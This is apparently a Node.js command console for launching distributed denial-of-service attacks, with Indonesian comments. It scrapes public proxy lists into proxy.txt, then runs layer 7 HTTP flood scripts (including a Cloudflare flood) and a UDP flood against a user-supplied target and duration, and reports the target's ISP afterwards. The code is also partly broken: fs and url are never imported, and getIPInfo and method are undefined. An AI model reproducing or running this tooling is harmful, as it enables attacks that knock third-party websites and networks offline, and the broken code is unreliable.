const { exec } = require('child_process');
const readline = require('readline');
const axios = require('axios');

// Scrape proxy dari sumber yang diberikan
async function scrapeProxies() {
  const proxySources = [
    'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=20000',
    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt',
    'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt',
    'https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper/main/proxies.txt',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt'
  ];

  let proxies = [];

    // Hapus file proxy.txt lama
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
    console.log('File Proxy lama berhasil dihapus');
  }
  
  for (const source of proxySources) {
    try {
      const response = await axios.get(source);
      proxies = proxies.concat(response.data.split('\n'));
    } catch (error) {
      console.log('Error scraping proxies from ${source}: ${error.message}');
    }
  }

  fs.writeFileSync('proxy.txt', proxies.join('\n'));
  console.log('Proxies successfully scraped and saved to proxy.txt');
}

// Mulai dengan scraping proxy saat script dijalankan
scrapeProxies();

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: '[Dir Console]: '
});

const commands = {
    attack: async (method, target, duration) => {
        let command;
        switch (method) {
            case 'gojo':
                command = `node src/l7/gojov5.js ${target} ${duration} 100 10 proxy.txt`;
                break;
            case 'spike':
                command = `node src/l7/spike.js ${target} 10 ${duration}`;
                break; 
            case 'cf-flood':
                command = `node src/l7/cf-flood.js ${target} ${duration}`;
                break;        
            // Tambahkan methods lain di sini
            default:
                console.log('Unknown method');
                return;
        }

        exec(command, async (err, stdout, stderr) => {
            if (err) {
                console.error(`Error: ${stderr}`);
                return;
            }
            console.log(stdout);

            // Mendapatkan informasi IP dan ISP   
            const parsing = new url.URL(target)
            const hostname = parsing.hostname
            const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
            const result = scrape.data;
            console.clear()
            console.log(`Target: ${result.query}`);
            console.log(`ISP: ${result.isp}`);
            console.log(`Duration: ${duration}`);
            console.log(`Methods: ${method}`);
        });
    },
    l4: async (method, target, port, duration) => {
        let command;
        switch (method) {
            case 'udp':
                command = `node src/l4/udp.js ${target} ${port} ${duration}`;
                break;
            // Tambahkan methods lain di sini
            default:
                console.log('Unknown method');
                return;
        }

        exec(command, async (err, stdout, stderr) => {
            if (err) {
                console.error(`Error: ${stderr}`);
                return;
            }
            console.log(stdout);

            // Mendapatkan informasi IP dan ISP
            const info = await getIPInfo(target);
            if (info) {
                console.log(`IP: ${target}`);
                console.log(`Port: ${port}`);
                console.log(`Duration: ${duration}`);
                console.log(`Methods: ${method}`); 
            }
        });
    },
    dualattack: async (target, duration) => {
        const command1 = `node src/l7/gojov5.js ${target} ${duration} 100 10 proxy.txt`;
        const command2 = `node src/l4/udp.js ${target} 443 ${duration}`; // Contoh method L4 dengan port 443

        exec(command1, async (err, stdout, stderr) => {
            if (err) {
                console.error(`Error on command1: ${stderr}`);
                return;
            }
            console.log(`Command1 output: \n${stdout}`);
        });

        exec(command2, async (err, stdout, stderr) => {
            if (err) {
                console.error(`Error on command2: ${stderr}`);
                return;
            }
            console.log(`Command2 output: \n${stdout}`);
        });
            const parsing = new url.URL(target)
            const hostname = parsing.hostname
            const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
            const result = scrape.data;
            console.clear()
            console.log(`Target: ${result.query}`);
            console.log(`ISP: ${result.isp}`);
            console.log(`Duration: ${duration}`);
            console.log(`Methods: ${method}`); 
    },
    help: () => {
        console.log('Available commands:');
        console.log('attack <method> <target> <duration>');
        console.log('l4 <method> <target> <port> <duration>');
        console.log('dualattack <target> <duration>');
        console.log('help');
    }
};

rl.prompt();

rl.on('line', (input) => {
    const args = input.trim().split(' ');
    const command = args.shift();

    if (commands[command]) {
        commands[command](...args);
    } else {
        console.log('Unknown command. Type "help" to see the list of commands.');
    }

    rl.prompt();
}).on('close', () => {
    console.log('Exiting console.');
    process.exit(0);
});

